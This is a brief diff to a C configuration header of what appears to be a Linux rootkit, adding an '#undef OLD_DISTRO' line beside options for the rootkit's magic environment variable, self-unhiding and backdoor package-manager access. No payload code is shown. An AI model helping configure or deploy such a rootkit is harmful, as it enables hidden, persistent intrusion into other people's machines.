@@ -13,4 +13,6 @@
 #define SET_MAGIC_ENV_UNHIDE // set the rootkit's magic environment variable when doing `./bdv unhideself`
 #define BACKDOOR_PKGMAN // allows access to certain package managers without ruining the box.
 
+#undef OLD_DISTRO // centos 5 or older. if this is defined you probably want a short gid too.
+
 /* everything past here is setup.py */
